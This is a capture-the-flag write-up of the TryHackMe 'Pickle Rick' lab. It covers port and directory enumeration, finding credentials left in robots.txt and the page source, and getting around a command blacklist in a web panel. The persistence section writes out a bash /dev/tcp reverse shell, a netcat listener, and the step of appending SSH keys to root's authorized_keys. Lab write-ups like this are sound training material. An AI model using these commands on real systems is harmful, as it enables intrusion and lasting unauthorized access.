# TryHackMe Pickle Rick Write-up

This is a walkthrough of my process completing the Pickle Rick room on TryHackMe.com. I will be using the attack box provided by TryHackMe in this case which utilizes the root user, however, this is not the best practice. It is always recommended you perform commands with the least privilege possible. Because I also managed to break the machine (*several times*) I will wildcard the last 2 octets of the IP address.

---

# Planning and Reconnaissance
*In this room, we are roleplaying as Morty from the hit TV show, "Rick and Morty".* Defining our scope: Rick has turned into a pickle and needs 3 ingredients for a potion to turn back into a human. Unfortunately, these ingredients are hidden on his computer, and Pickle Rick has forgotten his password. Our task is to retrieve his password, access his data, and locate the 3 separate files containing the 3 ingredients. Pickle Rick provided us with the target machine's IP address, 10.10.*.*.

# Scanning and Enumeration
We begin with NMap. Using the command "nmap -Pn -vvv 10.10.*.*" stealthily scans the first 1000 most common ports that might be active on a machine. This scan reveals ports 22 (**SSH**) and 80 (**HTTP**) are open, and likely running these services. 

![image](https://github.com/user-attachments/assets/40b3f0f6-f221-4b2e-9318-2dd3b9c80a5f)


Attempting the command "ssh rick@10.10.*.*" reveals password login via SSH is disabled, requiring a key. 

![image](https://github.com/user-attachments/assets/be74ac94-6fc0-43d7-b8e0-e32dd57a5d16)


Let's check if there is a website associated with that IP address, "HTTP://10.10.*.*"...

![image](https://github.com/user-attachments/assets/b3b64b84-130f-4f51-9410-44f043c5565b)

There is!

Now let's quickly investigate the website's HTML using the shortcut "CTRL + SHFT + I".

![image](https://github.com/user-attachments/assets/5b40a88a-60b9-42ea-b37e-d6e130caa739)

In the body of the HTML, we can see Rick left his username, R1ckRul3s. 

Reviewing the directories of the webpage, we can see there are some files. 

![image](https://github.com/user-attachments/assets/cd8034c7-379f-440b-8c80-8cab2175792f)


Visiting the "/assets*" directory reveals some more files and that the website is using Apache.

![image](https://github.com/user-attachments/assets/629ee3f1-ac20-44e8-84e1-1569dc7aa318)


However, only one in particular may have some relevance, that being a portal. Attempting to access "HTTP://10.10.*.*/portal", unfortunately, doesn't reveal anything so let's dig deeper.

![image](https://github.com/user-attachments/assets/adfdddff-82b6-4ae3-8626-6fdc030df218)

Using GoBuster to fuzz "*gobuster dir -u http://10.10.*.* -w /usr/share/wordlists/SecLists/Fuzzing/fuzz-Bo0oM.txt*" has revealed there are "login.php" and "robots.txt" pages, also indicating the webpage itself is using PHP.

![image](https://github.com/user-attachments/assets/9ed5f817-30f7-4ac6-964f-be8f0acd7f21)
![image](https://github.com/user-attachments/assets/8e8c7793-ba88-4f7a-aff6-9369ff0dae83)

Visiting the page "HTTP://10.10.*.*/robots.txt" reveals an odd string, "Wubbalubbadubdub", possibly the password.

![image](https://github.com/user-attachments/assets/466cd2ea-2b57-4e15-917c-c7aa4416f0e6)


# Gaining Access

Now, let's try some good ol' credential stuffing... Success!

image


Now that we have access, let's see what else we can find. 

Unfortunately, it seems these other tabs don't lead anywhere. 

![image](https://github.com/user-attachments/assets/3bfd5477-2ba7-42b1-899d-06cd92640840)

Let's check the HTML of this page.

![image](https://github.com/user-attachments/assets/769d5483-3fc3-45ee-98b9-f4098165087f)

This reveals an encoded string, "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==". Let's see if we can decode this using the command "echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | base64 -d".

![image](https://github.com/user-attachments/assets/9743543c-8ff8-4af5-a7a4-6b0be367ef21)

Unfortunately, it seems this was just an elaborate rabbit hole set up by Rick.

Let's try the command field. Running "uid" reveals we are logged in as "www-data", and not Rick which might explain why we can't view the other pages.

![image](https://github.com/user-attachments/assets/e1ece65a-3b8d-43b8-a56a-236476666200)

Let's check our permissions with "sudo -l".

![image](https://github.com/user-attachments/assets/c8572de5-65dc-406b-a52f-b719f80fa08d)

It appears we have access to all commands via sudo.

Let's check our current directory and what's in it.

![image](https://github.com/user-attachments/assets/d9a1a960-352f-4ef2-954e-6add073fd061)

![image](https://github.com/user-attachments/assets/b12ddf11-bf13-47e7-9e60-e55eb0b373c0)

There is the first ingredient, and a clue!

Unfortunately, it seems some commands like "locate", "tail", "head", and "cat" are prohibited even with "sudo", however, it seems this is a function of this webpage and not a lack of permissions. Let's see if we can bypass this by using some other commands.

![image](https://github.com/user-attachments/assets/13cb09ec-8907-4964-b9c4-fd6d0210f1af)

"find", "less", "strings", and "grep" as does "sudo /../../*" work. Visiting the specific directory in the website also works.

![image](https://github.com/user-attachments/assets/7a2a8260-3cb5-4add-9838-6bef308deeaf)

![image](https://github.com/user-attachments/assets/476fe758-7486-426e-9931-704c59536b7a)

Now that we can read the first ingredient, let's find the other two using "".

image

There are the last two!

image
image

And poof, just like that Rick is back to normal!

# Maintaining Access

However, because we are Evil Morty and we want to be able to access Rick's data in the future, let's see if we can create a [reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). We start by listening with "netcat", "nc -nlvp 8080". 

![image](https://github.com/user-attachments/assets/48a91638-d2a3-497f-bfe1-e029b65c7ffa)

Running the command "bash -i >& /dev/tcp/10.0.*.*/8080 0>&1" within the command filed does not work, however, when encapsulating first with "bash -c ''", it does work, "bash -c 'bash -i >& /dev/tcp/10.0.*.*/8080 0>&1'". 

![image](https://github.com/user-attachments/assets/d937e39d-0540-4ebc-84b8-5e9073a0218f)

Let's see if we can become root...

![image](https://github.com/user-attachments/assets/a8fb6697-4e48-4b93-a4d8-4a97b0e08075)

Success!

With this, we can simply generate a RSA key pair using "sshkeygen rsa"; 
Copy our public key;
And execute the following command within the shell. "sudo echo key >> /root/.ssh/authorized_keys && sudo echo key >> /home/ubuntu/.ssh/authorized_keys", 
Now let's test SSH login.

![image](https://github.com/user-attachments/assets/d234846e-61b2-46d1-8629-99ce7f20192d)

![image](https://github.com/user-attachments/assets/817cb8f7-4043-46e8-810a-5631e40ed260)

Success!

# Reporting
While SSH password login was disabled, this should be a reminder for Rick that security through obscurity can't work on it's own. There should always be other security measures in place. 

For improved security, we recommend Rick begin storing his username and password in an offline encrypted password manager, like KeePassXC, instead of the HTML and robots.txt files of his site. Additionally, Rick should separate the users, permissions, and access within his machine, as well as, disable root login via SSH.

---

# That's all folks!
